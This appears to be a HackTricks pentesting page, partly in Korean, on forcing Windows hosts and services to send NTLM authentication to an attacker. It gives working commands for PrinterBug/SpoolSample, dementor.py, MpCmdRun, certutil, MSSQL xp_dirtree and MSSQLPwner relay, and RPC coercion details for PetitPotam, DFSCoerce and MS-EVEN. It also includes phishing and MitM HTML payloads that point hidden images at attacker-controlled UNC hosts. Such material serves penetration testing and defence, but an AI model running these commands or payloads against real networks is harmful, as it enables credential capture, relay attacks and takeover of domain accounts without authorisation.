# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers)는 타사 종속성을 피하기 위해 MIDL compiler를 사용하여 C#으로 작성된 원격 인증 트리거들의 **collection**입니다.

## Spooler Service Abuse

만약 _**Print Spooler**_ 서비스가 **활성화되어 있다면,** 이미 알고 있는 일부 AD 자격증명을 사용해 도메인 컨트롤러의 프린트 서버에 새로운 인쇄 작업에 대한 **업데이트를 요청**하고 단순히 그에게 **알림을 어떤 시스템으로 전송하라고** 지시할 수 있습니다.  
참고로 프린터가 임의의 시스템으로 알림을 보낼 때, 그 **시스템**에 대해 **인증을 수행해야** 합니다. 따라서 공격자는 _**Print Spooler**_ 서비스가 임의의 **시스템**에 대해 **인증하도록** 만들 수 있으며, 서비스는 이 인증에서 **컴퓨터 계정**을 사용하게 됩니다.

### Finding Windows Servers on the domain

PowerShell을 사용해 Windows 호스트 목록을 가져옵니다. 서버가 보통 우선 대상이므로, 우선 거기에 집중합시다:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Spooler 서비스가 수신 중인지 확인하기

약간 수정된 @mysmartlogin의 (Vincent Le Toux의) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)를 사용하여 Spooler Service가 수신 중인지 확인하세요:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Linux에서 rpcdump.py를 사용해 MS-RPRN Protocol을 찾아볼 수도 있습니다.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### 서비스에게 임의의 호스트에 대해 인증하도록 요청하기

다음 링크에서 [SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket)을 컴파일할 수 있습니다.
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
또는 Linux를 사용 중이라면 [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) 또는 [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)를 사용하세요
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Unconstrained Delegation과 결합

공격자가 이미 [Unconstrained Delegation](unconstrained-delegation.md)이 설정된 컴퓨터를 장악한 상태라면, 공격자는 프린터가 해당 컴퓨터에 **인증하도록 강제할 수 있다**. Unconstrained Delegation 때문에 프린터의 컴퓨터 계정의 **TGT**는 Unconstrained Delegation이 설정된 컴퓨터의 **메모리**에 **저장**된다. 공격자가 이미 이 호스트를 장악했으므로, 그는 이 티켓을 **회수하여** 악용할 수 있다 ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / PrintNightmare-family
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Opnum: 0 RpcAsyncOpenPrinter
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Note: These methods accept parameters that can carry a UNC path (e.g., `\\attacker\share`). When processed, Windows will authenticate (machine/user context) to that UNC, enabling NetNTLM capture or relay.

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Effect: the target attempts to open the supplied backup log path and authenticates to the attacker-controlled UNC.
- Practical use: coerce Tier 0 assets (DC/RODC/Citrix/etc.) to emit NetNTLM, then relay to AD CS endpoints (ESC8/ESC11 scenarios) or other privileged services.

## PrivExchange

The `PrivExchange` attack is a result of a flaw found in the **Exchange Server `PushSubscription` feature**. This feature allows the Exchange server to be forced by any domain user with a mailbox to authenticate to any client-provided host over HTTP.

By default, the **Exchange service runs as SYSTEM** and is given excessive privileges (specifically, it has **WriteDacl privileges on the domain pre-2019 Cumulative Update**). This flaw can be exploited to enable the **relaying of information to LDAP and subsequently extract the domain NTDS database**. In cases where relaying to LDAP is not possible, this flaw can still be used to relay and authenticate to other hosts within the domain. The successful exploitation of this attack grants immediate access to the Domain Admin with any authenticated domain user account.

## Inside Windows

If you are already inside the Windows machine you can force Windows to connect to a server using privileged accounts with:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
또는 이 다른 기법을 사용하세요: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

certutil.exe lolbin (Microsoft-signed binary)을 사용하여 NTLM 인증을 강제할 수 있다:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### 이메일을 통해

만약 침해하려는 머신에 로그인하는 사용자의 **이메일 주소**를 알고 있다면, 그에게 다음과 같은 **1x1 이미지가 포함된 이메일**을 보낼 수 있습니다:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
그가 그것을 열면 인증을 시도할 것입니다.

### MitM

컴퓨터에 MitM attack을 수행할 수 있고 그가 볼 페이지에 HTML을 주입할 수 있다면 페이지에 다음과 같은 이미지를 주입해 볼 수 있습니다:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLM 인증을 강제로 유도하고 피싱하는 다른 방법들


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1 크래킹

만약 [NTLMv1 challenges read here how to crack them](../ntlm/index.html#ntlmv1-attack)을 캡처할 수 있다면.\

_Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"_

## References
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
